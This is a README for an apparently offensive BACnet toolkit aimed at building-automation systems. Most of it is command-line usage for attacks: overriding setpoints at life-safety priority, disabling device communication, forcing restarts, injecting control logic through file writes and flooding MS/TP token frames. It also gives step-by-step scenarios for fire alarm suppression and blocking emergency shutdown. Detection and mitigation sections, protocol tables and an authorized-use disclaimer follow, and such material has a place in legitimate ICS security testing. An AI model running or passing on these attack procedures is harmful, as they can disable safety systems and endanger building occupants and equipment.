# BACnet Security Assessment Framework

Comprehensive security testing toolkit for BACnet (Building Automation and Control Networks) protocol implementations.

## Overview

BACnet is a widely-used communication protocol for building automation and control systems, including HVAC, lighting, access control, and fire detection systems. This framework provides advanced security assessment capabilities for BACnet/IP, BACnet Ethernet, and BACnet MS/TP networks.

## Features

- **Device Discovery**: Broadcast-based Who-Is/I-Am device enumeration
- **Object Enumeration**: Complete object list extraction and property reading
- **WriteProperty Attacks**: Unauthorized property modification with priority override
- **Priority Array Manipulation**: Control override through BACnet priority mechanism
- **Device Communication Control**: Block/enable device communication (DCC service)
- **Device Reinitialization**: Force cold/warm restart of BACnet devices
- **COV Subscription**: Monitor Change-of-Value notifications for process state
- **Atomic File Write**: Project file infection and logic modification
- **MS/TP Token Manipulation**: Token passing attacks on MS/TP networks
- **Protocol Fuzzing**: Service-level fuzzing for vulnerability discovery

## Installation

```bash
pip install pyserial
```

## MITRE ATT&CK Mapping

| Technique | ID | Implementation |
|-----------|----|----|
| Monitor Process State | T0801 | read_property(), subscribe_cov() |
| Automated Collection | T0802 | subscribe_cov(), enumerate_objects() |
| Block Command Message | T0803 | device_communication_control(), mstp_token_manipulation() |
| Block Reporting Message | T0804 | device_communication_control(), mstp_token_manipulation() |
| Modify Parameter | T0836 | write_property(), manipulate_priority_array() |
| Unauthorized Command Message | T0855 | write_property(), fuzz_service() |
| Change Operating Mode | T0858 | reinitialize_device() |
| Point & Tag Identification | T0861 | read_property(), enumerate_objects() |
| Detect Operating Mode | T0868 | discover_devices() |
| Execution through API | T0871 | reinitialize_device(), atomic_write_file() |
| Project File Infection | T0873 | atomic_write_file() |
| Remote System Information Discovery | T0888 | discover_devices(), enumerate_objects() |

## Protocol Background

### BACnet Architecture

BACnet uses a layered architecture:
- **Application Layer**: Services (Read/Write Property, Who-Is, I-Am, etc.)
- **Network Layer**: NPDU with routing and addressing
- **Data Link Layer**: BACnet/IP (UDP), Ethernet, MS/TP (RS-485), etc.

### BACnet/IP Stack

```
+---------------------------+
| Application Layer (APDU)  |  Services, Object Access
+---------------------------+
| Network Layer (NPDU)      |  Routing, Addressing
+---------------------------+
| BACnet Virtual Link Layer |  BVLC (Port 47808/UDP)
+---------------------------+
| IP Layer                  |  UDP/IP
+---------------------------+
```

### BACnet Objects

BACnet defines standardized object types:
- **Analog Input/Output/Value**: Continuous values (temperature, pressure)
- **Binary Input/Output/Value**: Discrete states (on/off, open/closed)
- **Multi-state Input/Output/Value**: Multiple discrete states
- **Device**: Represents a BACnet device
- **File**: File storage and transfer
- **TrendLog**: Historical data logging
- **Schedule**: Time-based control

### Priority Array Mechanism

BACnet uses a 16-level priority array for command arbitration:
1. Manual-Life Safety (highest)
2. Automatic-Life Safety
3. Available
4. Available
5. Critical Equipment Control
6. Minimum On/Off
7. Available
8. Manual Operator (typical HMI writes)
9-15. Available
16. Available (lowest)

Relinquish Default: Value used when all priorities are NULL.

### MS/TP (Master-Slave/Token-Passing)

BACnet MS/TP operates on RS-485 with token-passing protocol:
- **Master Nodes**: Participate in token passing (0-127)
- **Slave Nodes**: Only respond to polls (128-254)
- **Token**: Grants right to initiate communication
- **Poll For Master**: Discover new master nodes

## Usage Examples

### Device Discovery

```bash
python bacnet_assessment.py --target 192.168.1.255 --discover --export-devices devices.json
```

Broadcasts Who-Is request and collects I-Am responses containing:
- Device instance number
- IP address and port
- Vendor ID (if available)
- Max APDU length

### Object Enumeration

```bash
python bacnet_assessment.py --target 192.168.1.100 --enumerate --device-id 1234 --export-objects objects.json
```

Reads the Device object's OBJECT_LIST property to enumerate all objects:
- Object type (Analog Input, Binary Output, etc.)
- Object instance number
- Object properties (name, description, present value)

### WriteProperty Attack

```bash
python bacnet_assessment.py --target 192.168.1.100 --write-property \
  --device-id 1234 --object-type 1 --object-instance 0 \
  --property 85 --value 100.0 --priority 8
```

Writes to PRESENT_VALUE (property 85) of Analog Output 0:
- Object Type 1 = Analog Output
- Property 85 = Present Value
- Priority 8 = Manual Operator level

**Attack Scenario**: Override setpoint to cause physical process disruption.

### Priority Array Manipulation

```bash
python bacnet_assessment.py --target 192.168.1.100 --priority-array \
  --device-id 1234 --object-type 1 --object-instance 5 \
  --priority 1 --value 50.0
```

Writes value at Priority 1 (Manual-Life Safety):
- Overrides all lower priorities (2-16)
- Bypasses normal operator control
- Maintains control until explicitly relinquished

**Attack Scenario**: Lock safety override to prevent emergency shutdown.

### Device Communication Control

```bash
python bacnet_assessment.py --target 192.168.1.100 --comm-control \
  --device-id 1234 --mode 1
```

Device Communication Control (DCC) modes:
- **0 (ENABLE)**: Enable all communication
- **1 (DISABLE)**: Disable initiation of communication
- **2 (DISABLE_INITIATION)**: Disable only communication initiation

**Attack Scenario**: Prevent device from reporting alarms or process changes.

### Device Reinitialization

```bash
python bacnet_assessment.py --target 192.168.1.100 --reinitialize \
  --device-id 1234 --state 0
```

Reinitialization states:
- **0 (COLDSTART)**: Full device reset, reload configuration
- **1 (WARMSTART)**: Restart without full configuration reload
- **2-6**: Backup/restore operations

**Attack Scenario**: Force device reset to disrupt operations or clear logs.

### COV Subscription

```bash
python bacnet_assessment.py --target 192.168.1.100 --subscribe-cov \
  --device-id 1234 --object-type 2 --object-instance 5
```

Subscribe to Change-of-Value notifications:
- Monitor Analog Value 5 for changes
- Receive automatic notifications on value change
- Useful for process state monitoring

### Atomic File Write

```bash
python bacnet_assessment.py --target 192.168.1.100 --atomic-write-file \
  --device-id 1234 --file-instance 0 --file-data "malicious_logic"
```

Write to BACnet File object:
- Target File object instance 0
- Write arbitrary data
- Potential for logic injection or configuration modification

**Attack Scenario**: Modify control logic or configuration files.

### MS/TP Token Manipulation

```bash
python bacnet_assessment.py --mstp-token --serial-port COM3 \
  --this-station 5 --next-station 10
```

MS/TP token passing manipulation:
- Floods network with token frames
- Disrupts normal token rotation
- Causes communication delays or denial of service

**Attack Scenario**: DoS attack on RS-485 MS/TP network.

### Protocol Fuzzing

```bash
python bacnet_assessment.py --target 192.168.1.100 --fuzz \
  --device-id 1234 --service 15 --iterations 1000
```

Fuzz BACnet services:
- Service 15 = WriteProperty
- Send malformed packets with random data
- Discover implementation vulnerabilities

## Attack Scenarios

### Scenario 1: HVAC Setpoint Manipulation

**Objective**: Modify temperature setpoints to cause equipment damage or occupant discomfort.

**Steps**:
1. Discover BACnet devices on network
2. Enumerate objects to find Analog Output for cooling setpoint
3. Write new setpoint value at high priority
4. Monitor via COV subscription to verify change persistence

```bash
python bacnet_assessment.py --target 192.168.1.255 --discover
python bacnet_assessment.py --target 192.168.1.100 --enumerate --device-id 1234
python bacnet_assessment.py --target 192.168.1.100 --write-property \
  --device-id 1234 --object-type 1 --object-instance 10 --property 85 --value 90.0 --priority 1
```

**MITRE**: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)

### Scenario 2: Fire Alarm Suppression

**Objective**: Prevent fire alarm reporting through communication control.

**Steps**:
1. Identify fire alarm panel BACnet device
2. Issue Device Communication Control to disable communication
3. Device cannot report alarms to central monitoring

```bash
python bacnet_assessment.py --target 192.168.1.50 --comm-control \
  --device-id 5678 --mode 1
```

**MITRE**: T0804 (Block Reporting Message)

### Scenario 3: Control Logic Modification

**Objective**: Inject malicious logic through file write operations.

**Steps**:
1. Enumerate File objects on BACnet device
2. Use Atomic Write File to modify control program
3. Reinitialize device to load modified logic

```bash
python bacnet_assessment.py --target 192.168.1.100 --enumerate --device-id 1234
python bacnet_assessment.py --target 192.168.1.100 --atomic-write-file \
  --device-id 1234 --file-instance 0 --file-data "$(cat malicious_code.txt)"
python bacnet_assessment.py --target 192.168.1.100 --reinitialize \
  --device-id 1234 --state 1
```

**MITRE**: T0873 (Project File Infection), T0858 (Change Operating Mode)

### Scenario 4: MS/TP Network Disruption

**Objective**: Disrupt MS/TP token passing to prevent device communication.

**Steps**:
1. Connect to MS/TP network via serial adapter
2. Flood network with token frames
3. Prevent legitimate devices from communicating

```bash
python bacnet_assessment.py --mstp-token --serial-port COM3 \
  --this-station 5 --next-station 5
```

**MITRE**: T0803 (Block Command Message), T0804 (Block Reporting Message)

## Detection and Mitigation

### Detection Indicators

1. **Unusual Write Operations**:
   - WriteProperty requests from unexpected sources
   - Writes at high priority levels (1-7)
   - Writes to critical objects (safety systems, alarms)

2. **Communication Anomalies**:
   - Device Communication Control from non-management systems
   - Unexpected device reinitialization requests
   - Excessive Who-Is broadcast traffic

3. **File Operations**:
   - Atomic Write File operations from unauthorized sources
   - File access outside maintenance windows
   - Unexpected file modifications

4. **MS/TP Attacks**:
   - Token frame flooding
   - Invalid station addresses
   - Protocol violations

### Mitigation Strategies

1. **Network Segmentation**:
   - Isolate BACnet networks from IT networks
   - Use VLANs for BACnet/IP traffic
   - Implement firewall rules on UDP port 47808

2. **Authentication**:
   - Enable password protection on critical services
   - Use BACnet Secure Connect (BACnet/SC) for encryption
   - Implement application-layer authentication

3. **Monitoring**:
   - Deploy IDS rules for BACnet anomalies
   - Log all write operations and critical service requests
   - Alert on priority array manipulation

4. **Access Control**:
   - Restrict write access to authorized systems only
   - Implement read-only access for monitoring systems
   - Use object property write protection

5. **Configuration Hardening**:
   - Disable unused services (DCC, Reinitialize Device)
   - Set password requirements for critical operations
   - Enable audit logging

## Technical Reference

### BACnet Service Codes

| Service | Code | Type | Description |
|---------|------|------|-------------|
| Read Property | 12 | Confirmed | Read single property value |
| Write Property | 15 | Confirmed | Write single property value |
| Who-Is | 8 | Unconfirmed | Device discovery request |
| I-Am | 0 | Unconfirmed | Device discovery response |
| Subscribe COV | 5 | Confirmed | Request change notifications |
| Device Communication Control | 17 | Confirmed | Control device communication |
| Reinitialize Device | 20 | Confirmed | Restart device |
| Atomic Write File | 7 | Confirmed | Write to file object |

### Object Type Codes

| Object Type | Code | Description |
|-------------|------|-------------|
| Analog Input | 0 | Continuous input (sensors) |
| Analog Output | 1 | Continuous output (actuators) |
| Analog Value | 2 | Continuous value (setpoints) |
| Binary Input | 3 | Discrete input (contacts) |
| Binary Output | 4 | Discrete output (relays) |
| Binary Value | 5 | Discrete value (flags) |
| Device | 8 | BACnet device object |
| File | 10 | File storage object |
| TrendLog | 20 | Historical data log |

### Property Identifiers

| Property | Code | Description |
|----------|------|-------------|
| Present Value | 85 | Current value of object |
| Priority Array | 87 | 16-level priority command array |
| Relinquish Default | 104 | Default value when all priorities NULL |
| Object Name | 77 | Human-readable object name |
| Description | 28 | Object description |
| Status Flags | 111 | In-Alarm, Fault, Overridden, Out-Of-Service |
| Out Of Service | 81 | Manual control override flag |

### BVLC Function Codes (BACnet/IP)

| Function | Code | Description |
|----------|------|-------------|
| BVLC-Result | 0x00 | Result message |
| Write-Broadcast-Distribution-Table | 0x01 | Configure BDT |
| Read-Broadcast-Distribution-Table | 0x02 | Read BDT |
| Read-Broadcast-Distribution-Table-Ack | 0x03 | BDT response |
| Forwarded-NPDU | 0x04 | Forwarded message |
| Register-Foreign-Device | 0x05 | Register as foreign device |
| Read-Foreign-Device-Table | 0x06 | Read FDT |
| Read-Foreign-Device-Table-Ack | 0x07 | FDT response |
| Delete-Foreign-Device-Table-Entry | 0x08 | Remove FDT entry |
| Distribute-Broadcast-To-Network | 0x09 | Distribute broadcast |
| Original-Unicast-NPDU | 0x0A | Unicast message |
| Original-Broadcast-NPDU | 0x0B | Broadcast message |

## File Reference

Implementation: `tools/bacnet_security_assessment/bacnet_assessment.py`

All code examples in this README correspond to actual implementations in the framework.

## Disclaimer

This framework is intended for authorized security testing and research only. Use only on systems you own or have explicit written permission to test. Unauthorized access to BACnet systems may violate laws and regulations including CFAA (Computer Fraud and Abuse Act) in the United States and similar legislation in other jurisdictions.

## References

- ASHRAE Standard 135-2020 (BACnet Protocol Specification)
- NIST SP 800-82 Rev. 2 (Guide to ICS Security)
- MITRE ATT&CK for ICS Framework
- BACnet International Technical Bulletins
- DOE/CISA ICS Security Guidelines

## Version

BACnet Security Assessment Framework v1.0
